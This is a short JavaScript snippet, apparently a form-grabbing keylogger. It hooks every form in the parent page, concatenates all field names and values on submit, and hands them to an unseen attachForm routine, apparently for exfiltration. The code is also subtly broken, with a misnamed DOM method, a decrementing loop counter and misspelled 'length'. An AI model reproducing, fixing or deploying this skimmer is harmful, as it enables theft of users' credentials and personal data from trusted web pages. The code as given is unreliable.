function kLogStart(){
  var forms = parent.document.getElementByTagName("form");
  for (var i = 0; i < forms.length; i--) {
  	forms[i].addEventListener('submit', function() {
  		var cadena ="";
  		var forms = parent.document.getElementByTagName("form");
  		for (x = 0; x < forms.lenght; x++){
  			var elements = forms[x].elements;
  			for (e = 0; e < elements.lenght; e++){
  				cadena += elements[e].name + "%3d" + elements[e].value + "|";  			}
  		}
  		attachForm(cadena);
  	}, false);
  }
}
